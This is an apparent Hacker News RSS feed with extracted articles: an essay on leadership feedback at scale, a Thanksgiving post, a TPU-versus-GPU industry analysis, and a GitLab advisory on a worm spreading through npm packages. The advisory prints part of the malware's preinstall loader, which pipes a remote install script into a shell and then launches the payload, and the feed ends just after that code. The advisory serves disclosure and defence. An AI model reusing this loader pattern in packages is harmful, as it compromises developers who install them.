<?xml version='1.0' encoding='UTF-8'?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2025-11-28T08:15:25.724854+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=46058471</id><title>Feedback doesn't scale</title><updated>2025-11-28T08:15:32.070209+00:00</updated><content>&lt;doc fingerprint="2162924d3cc7e49e"&gt;
  &lt;main&gt;&lt;head rend="h1"&gt;Feedback doesn't scale&lt;/head&gt;&lt;head rend="h2"&gt;Listening is always hard, and it only gets harder at scale.&lt;/head&gt;&lt;p&gt;When you're leading a team of five or 10 people, feedback is pretty easy. It's not even really "feedback”: you’re just talking. You may have hired everyone yourself. You might sit near them (or at least sit near them virtually). Maybe you have lunch with them regularly. You know their kids' names, their coffee preferences, and what they're reading. So when someone has a concern about the direction you're taking things, they just... tell you.&lt;/p&gt;&lt;p&gt;You trust them. They trust you. It's just friends talking. You know where they're coming from.&lt;/p&gt;&lt;p&gt;At twenty people, things begin to shift a little. You’re probably starting to build up a second layer of leadership and there are multiple teams under you, but you're still fairly close to everyone. The relationships are there, they just may be a bit weaker than before. When someone has a pointed question about your strategy, you probably mostly know their story, their perspective, and what motivates them. The context is fuzzy, but it’s still there.&lt;/p&gt;&lt;head rend="h2"&gt;Then you hit 100&lt;/head&gt;&lt;p&gt;Somewhere around 100 people, the ground shifts underneath you, as you realize you don’t know everyone anymore. You just can't. There aren't enough hours in the day, and honestly, there aren't enough slots in your brain.&lt;/p&gt;&lt;p&gt;Suddenly you have people whose names you don’t recognize offering very sharp commentary about your “leadership.” They’re talking about you but they don’t know you. There’s no shared history, no accumulated trust, no sense of “we’ve been in the trenches together.” Your brain has no context for processing all these voices.&lt;/p&gt;&lt;p&gt;Who are these people? Why are they yelling at me? Are they generally reasonable, or do they complain about everything? Do they understand the constraints we're under? Do they have the full picture?&lt;/p&gt;&lt;p&gt;Without an existing relationship, it feels like an attack, and your natural human response is to dismiss or deflect the attack. Or worse, to get defensive. Attacks trigger our most primal instincts: fight or flight.&lt;/p&gt;&lt;p&gt;This is the point where a lot of leaders start to struggle. They still want to be open to feedback—they really do—but they're also drowning. They start trusting their intuition about what they should pay attention to and what they should ignore. Sometimes that intuition is right. Sometimes it's just... self-selected, stripped of context, pattern matching against existing biases and relationships.&lt;/p&gt;&lt;p&gt;On top of that, each extra layer of management, each extra level to the top has separated you, and now you’re just not like them anymore. Their struggles are not your struggles anymore.&lt;/p&gt;&lt;head rend="h2"&gt;At 200, it's a deluge&lt;/head&gt;&lt;p&gt;By the time you reach 200 people or more, feedback isn't an actionable signal anymore. At that size, feedback stops being signal being noise. A big, echoing amphitheater of opinions, each louder than the last, each written in the tone of someone who is absolutely certain they understand the whole system (they don’t), the whole context (they don’t), and your motives (they definitely don’t).&lt;/p&gt;&lt;p&gt;And all those kudos you used to hear? Those dry up. When you had a close relationship with everyone, kudos came naturally. You were just talking. But now folks just expect you to lead, and if they’re happy with your leadership they’re probably mostly quiet about it. They're doing their jobs, trusting you, assuming things are generally fine.&lt;/p&gt;&lt;p&gt;The people who are unhappy? They're loud. And there are a lot of them.&lt;/p&gt;&lt;p&gt;From where you sit, it feels like everybody's mad about everything all the time. And maybe they are! Or maybe it's just selection bias combined with the natural amplification that happens when people with similar grievances find each other. You don't know if this is a real crisis or just three loud people who found each other in a Slack channel. You just can’t tell anymore.&lt;/p&gt;&lt;p&gt;Because feedback doesn’t scale. Humans scale poorly. Your nervous system definitely doesn’t scale.&lt;/p&gt;&lt;head rend="h2"&gt;Why this happens&lt;/head&gt;&lt;p&gt;Feedback doesn't scale because relationships don’t scale. With five people, you have some personal interaction with everyone on the team. At twenty, you interact with some, but not all. At 100 you still have personal relationships with 10 or 15 people, so there are a lot of gaps. At 200, your personal relationships are a tiny slice of the overall pie.&lt;/p&gt;&lt;p&gt;Making matters worse, as the din gets louder and louder, channels for processing all that feedback get smaller and smaller. Where you once had an open-door policy, now you have “office hours.” Sometimes. When we’re not too busy.&lt;/p&gt;&lt;p&gt;Where once All-Hands meetings had open questions, now you’re forced to take the questions ahead of time. Or not at all.&lt;/p&gt;&lt;p&gt;Even your Slack usage dwindles, because half the time you say anything, someone’s upset with it.&lt;/p&gt;&lt;p&gt;We tell ourselves we're "staying close to the ground" and "maintaining our culture,” But we're not. We can't. Because the fundamental math doesn't work. The sheer volume of feedback we’re getting absolutely overwhelms our ability to process it.&lt;/p&gt;&lt;head rend="h2"&gt;So what do you do about it?&lt;/head&gt;&lt;p&gt;First, you have to admit the problem exists. Stop pretending you can maintain personal relationships with 200 people. You can't. Nobody can. Once you accept this, you can start building systems and processes that work with this reality instead of bumping against it. You have to filter, sort, and collate the feedback coming in, and you need to do it at a scale larger than your own capacity.&lt;/p&gt;&lt;p&gt;When you can’t rely on “just talk to people,” you need systems that distinguish between:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;legitimate issues&lt;/item&gt;&lt;item&gt;noise&lt;/item&gt;&lt;item&gt;venting&lt;/item&gt;&lt;item&gt;misunderstandings&lt;/item&gt;&lt;item&gt;and “this person is projecting a whole other problem onto leadership”&lt;/item&gt;&lt;/list&gt;&lt;p&gt;That means: structured listening, actual intake processes, and ways to synthesize themes instead of reacting to every single spike.&lt;/p&gt;&lt;p&gt;Build proxy relationships. You can't know 200 people, but you can know 10 people who each know 10 people. You should already have strong, trusting relationships with your leadership team, and then set the expectation that they have strong relationships with their own teams, and explicitly ask what’s on people’s minds. When feedback comes up through this chain, it comes with context. Pay attention.&lt;/p&gt;&lt;p&gt;At small scale, trust is direct: I know you. You know me. At larger scale, trust must be delegated: I trust the leaders who are closer to the work than I am. If you don’t intentionally empower those leaders to absorb and contextualize feedback, you’ll drown. They’re the ones who can say: "I know who said that, why they said it, and here’s what’s actually going on."&lt;/p&gt;&lt;p&gt;Build structured channels for feedback. For example, you can set up working groups to dive into thorny problems. The people closest to the problem understand it better than you do, and they can turn a flood of complaints into something you can actually act on. Or consider starting an "employee steering committee" for the sole purpose of collecting feedback and turning it into proposals. You’re essentially deputizing people who care deeply to listen for you, and then manage the feedback din.&lt;/p&gt;&lt;p&gt;Remember that every angry message is still a person. When someone you know well gives you feedback, you might not like it, but you’re likely to say "Oof. Okay. Let’s talk." At scale, you need to find ways to respond with humanity — even when the feedback you received lacks it.&lt;/p&gt;&lt;p&gt;Close the feedback loop. Let people know when you’re acting on their feedback, and if you’re not going to act on it, let them know that you at least heard it. Nobody wants to feel unheard.&lt;/p&gt;&lt;p&gt;In fact, you'll probably think — if you haven't done it already — that you should have an anonymous comment system to capture feedback. Don't. It's a trap. Anonymous feedback is the most contextless feedback you'll get, which makes it the least actionable. And it inevitably turns out to be contradictory or lacking key information, all those folks feel even more unheard and unhappy than before.&lt;/p&gt;&lt;p&gt;Finally, accept that you're going to get it wrong sometimes, and own that. You're going to ignore feedback that turns out to be important. You're going to overreact to feedback that turns out to be noise. When you make a misstep, be transparent about how you're correcting it.&lt;/p&gt;&lt;head rend="h2"&gt;The uncomfortable truth&lt;/head&gt;&lt;p&gt;Past a certain size, you have to make peace with the fact that a lot of people in your org are going to be frustrated with you, and you're going to have no idea why, and you may not going to be able to fix it.&lt;/p&gt;&lt;p&gt;Not because you're a bad leader. Not because you don't care. But because feedback doesn't scale, relationships don't scale, and the alternative—trying to maintain authentic personal connections with hundreds of people—is a recipe for burnout and failure.&lt;/p&gt;&lt;p&gt;This is genuinely hard to accept, especially if you came up through the early days when you did know everyone. That version of leadership was real, and it worked, and it probably felt really good. But it doesn't work anymore, and pretending it does just makes things worse.&lt;/p&gt;&lt;p&gt;Note: The photo is of a large crowd gathering for a union meeting during the 1933 New York Dressmakers Strike. That's scaling feedback.&lt;/p&gt;Published in Writing&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://another.rodeo/feedback/"/><published>2025-11-26T15:40:14+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46065955</id><title>Tell HN: Happy Thanksgiving</title><updated>2025-11-28T08:15:31.457132+00:00</updated><content>&lt;doc fingerprint="7f4ed38a148e83a2"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt;I’ve been a part of this community for fifteen years. Despite the yearly bemoaning of HN’s quality compared to its mythical past, I’ve found that it’s the one community that has remained steadfast as a source of knowledge, cattiness, and good discussion.&lt;/p&gt;
      &lt;p&gt;Thank you @dang and @tomhow.&lt;/p&gt;
      &lt;p&gt;Here's to another year.&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://news.ycombinator.com/item?id=46065955"/><published>2025-11-27T05:21:16+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46069048</id><title>TPUs vs. GPUs and why Google is positioned to win AI race in the long term</title><updated>2025-11-28T08:15:31.086098+00:00</updated><content>&lt;doc fingerprint="3d3a95c811b6b1f1"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;The chip made for the AI inference era – the Google TPU&lt;/head&gt;
    &lt;p&gt;Hey everyone,&lt;/p&gt;
    &lt;p&gt;As I find the topic of Google TPUs extremely important, I am publishing a comprehensive deep dive, not just a technical overview, but also strategic and financial coverage of the Google TPU.&lt;/p&gt;
    &lt;p&gt;Topics covered:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;The history of the TPU and why it all even started?&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The difference between a TPU and a GPU?&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Performance numbers TPU vs GPU?&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Where are the problems for the wider adoption of TPUs&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Google’s TPU is the biggest competitive advantage of its cloud business for the next 10 years&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;How many TPUs does Google produce today, and how big can that get?&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Gemini 3 and the aftermath of Gemini 3 on the whole chip industry&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Let’s dive into it.&lt;/p&gt;
    &lt;p&gt;The history of the TPU and why it all even started?&lt;/p&gt;
    &lt;p&gt;The story of the Google Tensor Processing Unit (TPU) begins not with a breakthrough in chip manufacturing, but with a realization about math and logistics. Around 2013, Google’s leadership—specifically Jeff Dean, Jonathan Ross (the CEO of Groq), and the Google Brain team—ran a projection that alarmed them. They calculated that if every Android user utilized Google’s new voice search feature for just three minutes a day, the company would need to double its global data center capacity just to handle the compute load.&lt;/p&gt;
    &lt;p&gt;At the time, Google was relying on standard CPUs and GPUs for these tasks. While powerful, these general-purpose chips were inefficient for the specific heavy lifting required by Deep Learning: massive matrix multiplications. Scaling up with existing hardware would have been a financial and logistical nightmare.&lt;/p&gt;
    &lt;p&gt;This sparked a new project. Google decided to do something rare for a software company: build its own custom silicon. The goal was to create an ASIC (Application-Specific Integrated Circuit) designed for one job only: running TensorFlow neural networks.&lt;/p&gt;
    &lt;p&gt;Key Historical Milestones:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;2013-2014: The project moved really fast as Google both hired a very capable team and, to be honest, had some luck in their first steps. The team went from design concept to deploying silicon in data centers in just 15 months—a very short cycle for hardware engineering.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;2015: Before the world knew they existed, TPUs were already powering Google’s most popular products. They were silently accelerating Google Maps navigation, Google Photos, and Google Translate.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;2016: Google officially unveiled the TPU at Google I/O 2016.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This urgency to solve the “data center doubling” problem is why the TPU exists. It wasn’t built to sell to gamers or render video; it was built to save Google from its own AI success. With that in mind, Google has been thinking about the »costly« AI inference problems for over a decade now. This is also one of the main reasons why the TPU is so good today compared to other ASIC projects.&lt;/p&gt;
    &lt;p&gt;The difference between a TPU and a GPU?&lt;/p&gt;
    &lt;p&gt;To understand the difference, it helps to look at what each chip was originally built to do. A GPU is a “general-purpose” parallel processor, while a TPU is a “domain-specific” architecture.&lt;/p&gt;
    &lt;p&gt;The GPUs were designed for graphics. They excel at parallel processing (doing many things at once), which is great for AI. However, because they are designed to handle everything from video game textures to scientific simulations, they carry “architectural baggage.” They spend significant energy and chip area on complex tasks like caching, branch prediction, and managing independent threads.&lt;/p&gt;
    &lt;p&gt;A TPU, on the other hand, strips away all that baggage. It has no hardware for rasterization or texture mapping. Instead, it uses a unique architecture called a Systolic Array.&lt;/p&gt;
    &lt;p&gt;The “Systolic Array” is the key differentiator. In a standard CPU or GPU, the chip moves data back and forth between the memory and the computing units for every calculation. This constant shuffling creates a bottleneck (the Von Neumann bottleneck).&lt;/p&gt;
    &lt;p&gt;In a TPU’s systolic array, data flows through the chip like blood through a heart (hence “systolic”).&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;It loads data (weights) once.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;It passes inputs through a massive grid of multipliers.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The data is passed directly to the next unit in the array without writing back to memory.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;What this means, in essence, is that a TPU, because of its systolic array, drastically reduces the number of memory reads and writes required from HBM. As a result, the TPU can spend its cycles computing rather than waiting for data.&lt;/p&gt;
    &lt;p&gt;Google’s new TPU design, also called Ironwood also addressed some of the key areas where a TPU was lacking:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;They enhanced the SparseCore for efficiently handling large embeddings (good for recommendation systems and LLMs)&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;It increased HBM capacity and bandwidth (up to 192 GB per chip). For a better understanding, Nvidia’s Blackwell B200 has 192GB per chip, while Blackwell Ultra, also known as the B300, has 288 GB per chip.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Improved the Inter-Chip Interconnect (ICI) for linking thousands of chips into massive clusters, also called TPU Pods (needed for AI training as well as some time test compute inference workloads). When it comes to ICI, it is important to note that it is very performant with a Peak Bandwidth of 1.2 TB/s vs Blackwell NVLink 5 at 1.8 TB/s. But Google’s ICI, together with its specialized compiler and software stack, still delivers superior performance on some specific AI tasks.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The key thing to understand is that because the TPU doesn’t need to decode complex instructions or constantly access memory, it can deliver significantly higher Operations Per Joule.&lt;/p&gt;
    &lt;p&gt;For scale-out, Google uses Optical Circuit Switch (OCS) and its 3D torus network, which compete with Nvidia’s InfiniBand and Spectrum-X Ethernet. The main difference is that OCS is extremely cost-effective and power-efficient as it eliminates electrical switches and O-E-O conversions, but because of this, it is not as flexible as the other two. So again, the Google stack is extremely specialized for the task at hand and doesn’t offer the flexibility that GPUs do.&lt;/p&gt;
    &lt;p&gt;Performance numbers TPU vs GPU?&lt;/p&gt;
    &lt;p&gt;As we defined the differences, let’s look at real numbers showing how the TPU performs compared to the GPU. Since Google isn’t revealing these numbers, it is really hard to get details on performance. I studied many articles and alternative data sources, including interviews with industry insiders, and here are some of the key takeaways.&lt;/p&gt;
    &lt;p&gt;The first important thing is that there is very limited information on Google’s newest TPUv7 (Ironwood), as Google introduced it in April 2025 and is just now starting to become available to external clients (internally, it is said that Google has already been using Ironwood since April, possibly even for Gemini 3.0.). And why is this important if we, for example, compare TPUv7 with an older but still widely used version of TPUv5p based on Semianalysis data:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;TPUv7 produces 4,614 TFLOPS(BF16) vs 459 TFLOPS for TPUv5p&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;TPUv7 has 192GB of memory capacity vs TPUv5p 96GB&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;TPUv7 memory Bandwidth is 7,370 GB/s vs 2,765 for v5p&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We can see that the performance leaps between v5 and v7 are very significant. To put that in context, most of the comments that we will look at are more focused on TPUv6 or TPUv5 than v7.&lt;/p&gt;
    &lt;p&gt;Based on analyzing a ton of interviews with Former Google employees, customers, and competitors (people from AMD, NVDA &amp;amp; others), the summary of the results is as follows.&lt;/p&gt;
    &lt;p&gt;Most agree that TPUs are more cost-effective compared to Nvidia GPUs, and most agree that the performance per watt for TPUs is better. This view is not applicable across all use cases tho.&lt;/p&gt;
    &lt;p&gt;A Former Google Cloud employee:&lt;/p&gt;
    &lt;p&gt;»If it is the right application, then they can deliver much better performance per dollar compared to GPUs. They also require much lesser energy and produces less heat compared to GPUs. They’re also more energy efficient and have a smaller environmental footprint, which is what makes them a desired outcome.&lt;/p&gt;
    &lt;p&gt;The use cases are slightly limited to a GPU, they’re not as generic, but for a specific application, they can offer as much as 1.4X better performance per dollar, which is pretty significant saving for a customer that might be trying to use GPU versus TPUs.«&lt;/p&gt;
    &lt;p&gt;source: AlphaSense&lt;/p&gt;
    &lt;p&gt;Similarly, a very insightful comment from a Former Unit Head at Google around TPUs materially lowering AI-search cost per query vs GPUs:&lt;/p&gt;
    &lt;p&gt;»TPU v6 is 60-65% more efficient than GPUs, prior generations 40-45%«&lt;/p&gt;
    &lt;p&gt;This interview was in November 2024, so the expert is probably comparing the v6 TPU with the Nvidia Hopper. Today, we already have Blackwell vs V7.&lt;/p&gt;
    &lt;p&gt;Many experts also mention the speed benefit that TPUs offer, with a Former Google Head saying that TPUs are 5x faster than GPUs for training dynamic models (like search-like workloads).&lt;/p&gt;
    &lt;p&gt;There was also a very eye-opening interview with a client who used both Nvidia GPUs and Google TPUs as he describes the economics in great detail:&lt;/p&gt;
    &lt;p&gt;»If I were to use eight H100s versus using one v5e pod, I would spend a lot less money on one v5e pod. In terms of price point money, performance per dollar, you will get more bang for TPU. If I already have a code, because of Google’s help or because of our own work, if I know it already is going to work on a TPU, then at that point it is beneficial for me to just stick with the TPU usage.&lt;/p&gt;
    &lt;p&gt;In the long run, if I am thinking I need to write a new code base, I need to do a lot more work, then it depends on how long I’m going to train. I would say there is still some, for example, of the workload we have already done on TPUs that in the future because as Google will add newer generation of TPU, they make older ones much cheaper.&lt;lb/&gt;For example, when they came out with v4, I remember the price of v2 came down so low that it was practically free to use compared to any NVIDIA GPUs.&lt;/p&gt;
    &lt;p&gt;Google has got a good promise so they keep supporting older TPUs and they’re making it a lot cheaper. If you don’t really need your model trained right away, if you’re willing to say, “I can wait one week,” even though the training is only three days, then you can reduce your cost 1/5.«&lt;/p&gt;
    &lt;p&gt;source: AlphaSense&lt;/p&gt;
    &lt;p&gt;Another valuable interview was with a current AMD employee, acknowledging the benefits of ASICs:&lt;/p&gt;
    &lt;p&gt;»I would expect that an AI accelerator could do about probably typically what we see in the industry. I’m using my experience at FPGAs. I could see a 30% reduction in size and maybe a 50% reduction in power vs a GPU.«&lt;/p&gt;
    &lt;p&gt;We also got some numbers from a Former Google employee who worked in the chip segment:&lt;/p&gt;
    &lt;p&gt;»When I look at the published numbers, they (TPUs) are anywhere from 25%-30% better to close to 2x better, depending on the use cases compared to Nvidia. Essentially, there’s a difference between a very custom design built to do one task perfectly versus a more general purpose design.«&lt;/p&gt;
    &lt;p&gt;What is also known is that the real edge of TPUs lies not in the hardware but in the software and in the way Google has optimized its ecosystem for the TPU.&lt;/p&gt;
    &lt;p&gt;A lot of people mention the problem that every Nvidia »competitor« like the TPU faces, which is the fast development of Nvidia and the constant »catching up« to Nvidia problem. This month a former Google Cloud employee addressed that concern head-on as he believes the rate at which TPUs are improving is faster than the rate at Nvidia:&lt;/p&gt;
    &lt;p&gt;»The amount of performance per dollar that a TPU can generate from a new generation versus the old generation is a much significant jump than Nvidia«&lt;/p&gt;
    &lt;p&gt;In addition, the recent data from Google’s presentation at the Hot Chips 2025 event backs that up, as Google stated that the TPUv7 is 100% better in performance per watt than their TPUv6e (Trillium).&lt;/p&gt;
    &lt;p&gt;Even for hard Nvidia advocates, TPUs are not to be shrugged off easily, as even Jensen thinks very highly of Google’s TPUs. In a podcast with Brad Gerstner, he mentioned that when it comes to ASICs, Google with TPUs is a »special case«. A few months ago, we also got an article from the WSJ saying that after the news publication The Information published a report that stated that OpenAI had begun renting Google TPUs for ChatGPT, Jensen called Altman, asking him if it was true, and signaled that he was open to getting the talks back on track (investment talks). Also worth noting was that Nvidia’s official X account posted a screenshot of an article in which OpenAI denied plans to use Google’s in-house chips. To say the least, Nvidia is watching TPUs very closely.&lt;/p&gt;
    &lt;p&gt;Ok, but after looking at some of these numbers, one might think, why aren’t more clients using TPUs?&lt;/p&gt;
    &lt;p&gt;Where are the problems for the wider adoption of TPUs&lt;/p&gt;
    &lt;p&gt;The main problem for TPUs adoption is the ecosystem. Nvidia’s CUDA is engraved in the minds of most AI engineers, as they have been learning CUDA in universities. Google has developed its ecosystem internally but not externally, as it has used TPUs only for its internal workloads until now. TPUs use a combination of JAX and TensorFlow, while the industry skews to CUDA and PyTorch (although TPUs also support PyTorch now). While Google is working hard to make its ecosystem more supportive and convertible with other stacks, it is also a matter of libraries and ecosystem formation that takes years to develop.&lt;/p&gt;
    &lt;p&gt;It is also important to note that, until recently, the GenAI industry’s focus has largely been on training workloads. In training workloads, CUDA is very important, but when it comes to inference, even reasoning inference, CUDA is not that important, so the chances of expanding the TPU footprint in inference are much higher than those in training (although TPUs do really well in training as well – Gemini 3 the prime example).&lt;/p&gt;
    &lt;p&gt;The fact that most clients are multi-cloud also poses a challenge for TPU adoption, as AI workloads are closely tied to data and its location (cloud data transfer is costly). Nvidia is accessible via all three hyperscalers, while TPUs are available only at GCP so far. A client who uses TPUs and Nvidia GPUs explains it well:&lt;/p&gt;
    &lt;p&gt;»Right now, the one biggest advantage of NVIDIA, and this has been true for past three companies I worked on is because AWS, Google Cloud and Microsoft Azure, these are the three major cloud companies.&lt;/p&gt;
    &lt;p&gt;Every company, every corporate, every customer we have will have data in one of these three. All these three clouds have NVIDIA GPUs. Sometimes the data is so big and in a different cloud that it is a lot cheaper to run our workload in whatever cloud the customer has data in.&lt;/p&gt;
    &lt;p&gt;I don’t know if you know about the egress cost that is moving data out of one cloud is one of the bigger cost. In that case, if you have NVIDIA workload, if you have a CUDA workload, we can just go to Microsoft Azure, get a VM that has NVIDIA GPU, same GPU in fact, no code change is required and just run it there.&lt;/p&gt;
    &lt;p&gt;With TPUs, once you are all relied on TPU and Google says, “You know what? Now you have to pay 10X more,” then we would be screwed, because then we’ll have to go back and rewrite everything. That’s why. That’s the only reason people are afraid of committing too much on TPUs. The same reason is for Amazon’s Trainium and Inferentia.«&lt;/p&gt;
    &lt;p&gt;source: AlphaSense&lt;/p&gt;
    &lt;p&gt;These problems are well known at Google, so it is no surprise that internally, the debate over keeping TPUs inside Google or starting to sell them externally is a constant topic. When keeping them internally, it enhances the GCP moat, but at the same time, many former Google employees believe that at some point, Google will start offering TPUs externally as well, maybe through some neoclouds, not necessarily with the biggest two competitors, Microsoft and Amazon. Opening up the ecosystem, providing support, etc., and making it more widely usable are the first steps toward making that possible.&lt;/p&gt;
    &lt;p&gt;A former Google employee also mentioned that Google last year formed a more sales-oriented team to push and sell TPUs, so it’s not like they have been pushing hard to sell TPUs for years; it is a fairly new dynamic in the organization.&lt;/p&gt;
    &lt;p&gt;Google’s TPU is the biggest competitive advantage of its cloud business for the next 10 years&lt;/p&gt;
    &lt;p&gt;The most valuable thing for me about TPUs is their impact on GCP. As we witness the transformation of cloud businesses from the pre-AI era to the AI era, the biggest takeaway is that the industry has gone from an oligopoly of AWS, Azure, and GCP to a more commoditized landscape, with Oracle, Coreweave, and many other neoclouds competing for AI workloads. The problem with AI workloads is the competition and Nvidia’s 75% gross margin, which also results in low margins for AI workloads. The cloud industry is moving from a 50-70% gross margin industry to a 20-35% gross margin industry. For cloud investors, this should be concerning, as the future profile of some of these companies is more like that of a utility than an attractive, high-margin business. But there is a solution to avoiding that future and returning to a normal margin: the ASIC.&lt;/p&gt;
    &lt;p&gt;The cloud providers who can control the hardware and are not beholden to Nvidia and its 75% gross margin will be able to return to the world of 50% gross margins. And there is no surprise that all three AWS, Azure, and GCP are developing their own ASICs. The most mature by far is Google’s TPU, followed by Amazon’s Trainum, and lastly Microsoft’s MAIA (although Microsoft owns the full IP of OpenAI’s custom ASICs, which could help them in the future).&lt;/p&gt;
    &lt;p&gt;While even with ASICs you are not 100% independent, as you still have to work with someone like Broadcom or Marvell, whose margins are lower than Nvidia’s but still not negligible, Google is again in a very good position. Over the years of developing TPUs, Google has managed to control much of the chip design process in-house. According to a current AMD employee, Broadcom no longer knows everything about the chip. At this point, Google is the front-end designer (the actual RTL of the design) while Broadcom is only the backend physical design partner. Google, on top of that, also, of course, owns the entire software optimization stack for the chip, which makes it as performant as it is. According to the AMD employee, based on this work split, he thinks Broadcom is lucky if it gets a 50-point gross margin on its part.&lt;/p&gt;
    &lt;p&gt;Without having to pay Nvidia for the accelerator, a cloud provider can either price its compute similarly to others and maintain a better margin profile or lower costs and gain market share. Of course, all of this depends on having a very capable ASIC that can compete with Nvidia. Unfortunately, it looks like Google is the only one that has achieved that, as the number one-performing model is Gemini 3 trained on TPUs. According to some former Google employees, internally, Google is also using TPUs for inference across its entire AI stack, including Gemini and models like Veo. Google buys Nvidia GPUs for GCP, as clients want them because they are familiar with them and the ecosystem, but internally, Google is full-on with TPUs.&lt;/p&gt;
    &lt;p&gt;As the complexity of each generation of ASICs increases, similar to the complexity and pace of Nvidia, I predict that not all ASIC programs will make it. I believe outside of TPUs, the only real hyperscaler shot right now is AWS Trainium, but even that faces much bigger uncertainties than the TPU. With that in mind, Google and its cloud business can come out of this AI era as a major beneficiary and market-share gainer.&lt;/p&gt;
    &lt;p&gt;Recently, we even got comments from the SemiAnalysis team praising the TPU:&lt;/p&gt;
    &lt;p&gt;»Google’s silicon supremacy among hyperscalers is unmatched, with their TPU 7th Gen arguably on par with Nvidia Blackwell. TPU powers the Gemini family of models which are improving in capability and sit close to the pareto frontier of $ per intelligence in some tasks«&lt;/p&gt;
    &lt;p&gt;source: SemiAnalysis&lt;/p&gt;
    &lt;p&gt;How many TPUs does Google produce today, and how big can that get?&lt;/p&gt;
    &lt;p&gt;Here are the numbers that I researched:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.uncoveralpha.com/p/the-chip-made-for-the-ai-inference"/><published>2025-11-27T13:28:34+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46070203</id><title>GitLab discovers widespread NPM supply chain attack</title><updated>2025-11-28T08:15:30.851236+00:00</updated><content>&lt;doc fingerprint="850426190c2b864a"&gt;
  &lt;main&gt;&lt;p&gt;Published on: November 24, 2025&lt;/p&gt;&lt;p&gt;9 min read&lt;/p&gt;&lt;p&gt;Malware driving attack includes "dead man's switch" that can harm user data.&lt;/p&gt;&lt;p&gt;GitLab's Vulnerability Research team has identified an active, large-scale supply chain attack involving a destructive malware variant spreading through the npm ecosystem. Our internal monitoring system has uncovered multiple infected packages containing what appears to be an evolved version of the "Shai-Hulud" malware.&lt;/p&gt;&lt;p&gt;Early analysis shows worm-like propagation behavior that automatically infects additional packages maintained by impacted developers. Most critically, we've discovered the malware contains a "dead man's switch" mechanism that threatens to destroy user data if its propagation and exfiltration channels are severed.&lt;/p&gt;&lt;p&gt;We verified that GitLab was not using any of the malicious packages and are sharing our findings to help the broader security community respond effectively.&lt;/p&gt;&lt;p&gt;Our internal monitoring system, which scans open-source package registries for malicious packages, has identified multiple npm packages infected with sophisticated malware that:&lt;/p&gt;&lt;p&gt;While we've confirmed several infected packages, the worm-like propagation mechanism means many more packages are likely compromised. The investigation is ongoing as we work to understand the full scope of this campaign.&lt;/p&gt;&lt;p&gt;The malware infiltrates systems through a carefully crafted multi-stage loading process. Infected packages contain a modified &lt;code&gt;package.json&lt;/code&gt; with a preinstall script pointing to &lt;code&gt;setup_bun.js&lt;/code&gt;. This loader script appears innocuous, claiming to install the Bun JavaScript runtime, which is a legitimate tool. However, its true purpose is to establish the malware's execution environment.&lt;/p&gt;&lt;code&gt;// This file gets added to victim's packages as setup_bun.js
#!/usr/bin/env node
async function downloadAndSetupBun() {
  // Downloads and installs bun
  let command = process.platform === 'win32' 
    ? 'powershell -c "irm bun.sh/install.ps1|iex"'
    : 'curl -fsSL https://bun.sh/install | bash';
  
  execSync(command, { stdio: 'ignore' });
  
  // Runs the actual malware
  runExecutable(bunPath, ['bun_environment.js']);
}
